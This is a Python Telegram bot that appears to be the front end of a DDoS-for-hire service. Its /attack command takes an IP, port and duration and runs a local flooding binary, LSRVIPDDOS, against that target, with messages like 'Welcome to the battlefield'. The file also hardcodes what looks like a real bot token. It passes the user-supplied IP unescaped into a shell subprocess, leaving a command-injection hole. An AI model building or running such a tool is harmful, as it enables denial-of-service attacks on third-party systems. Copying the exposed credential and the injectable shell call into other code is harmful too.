import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '8181894570:AAFcLkIGqI_4H6tphXjhkdND0B6HO4Blke4'

async def start(update: Update, context: CallbackContext):
    """Handles the /start command and sends a welcome message."""
    try:
        chat_id = update.effective_chat.id
        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use /attack <ip> <port> <duration>*\n"
            "*Let the war begin! ⚔️💥*"
        )
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    except TelegramError as e:
        print(f"Telegram Error: {e}")

async def run_attack(chat_id, ip, port, duration, context):
    """Executes the attack command in a subprocess and handles errors."""
    try:
        # Validate input data
        if not ip or not port.isdigit() or not duration.isdigit():
            await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid parameters provided!*", parse_mode='Markdown')
            return
        
        # Convert port and duration to integers
        port = int(port)
        duration = int(duration)

        # Ensure port and duration are within valid ranges
        if not (1 <= port <= 65535):
            await context.bot.send_message(chat_id=chat_id, text="*❌ Port number must be between 1 and 65535!*", parse_mode='Markdown')
            return
        if duration <= 0:
            await context.bot.send_message(chat_id=chat_id, text="*❌ Duration must be a positive number!*", parse_mode='Markdown')
            return

        # Check if attack script exists
        if not os.path.exists("./LSRVIPDDOS"):
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack script not found! Ensure LSRVIPDDOS exists in the directory.*", parse_mode='Markdown')
            return

        # Execute the attack command
        process = await asyncio.create_subprocess_shell(
            f"./LSRVIPDDOS {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            output_msg = f"[stdout]\n{stdout.decode()}"
            print(output_msg)
        if stderr:
            error_msg = f"[stderr]\n{stderr.decode()}"
            print(error_msg)
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error executing attack:*\n```{error_msg}```", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Unexpected error: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Handles the /attack command and launches an attack."""
    try:
        chat_id = update.effective_chat.id
        args = context.args

        # Ensure the correct number of arguments is provided
        if len(args) != 3:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
            return

        ip, port, duration = args

        # Inform the user that the attack is being launched
        await context.bot.send_message(chat_id=chat_id, text=( 
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {ip}:{port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ), parse_mode='Markdown')

        # Start the attack process
        asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

    except TelegramError as e:
        print(f"Telegram API Error: {e}")
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ An error occurred while processing your command.*", parse_mode='Markdown')
    except Exception as e:
        print(f"Unexpected Error: {e}")
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unexpected error occurred. Please try again later.*", parse_mode='Markdown')

def main():
    """Initializes the bot and sets up command handlers."""
    try:
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("attack", attack))

        print("Bot is running...")
        application.run_polling()
    except Exception as e:
        print(f"Critical Error: {e}")

if __name__ == '__main__':
    main()
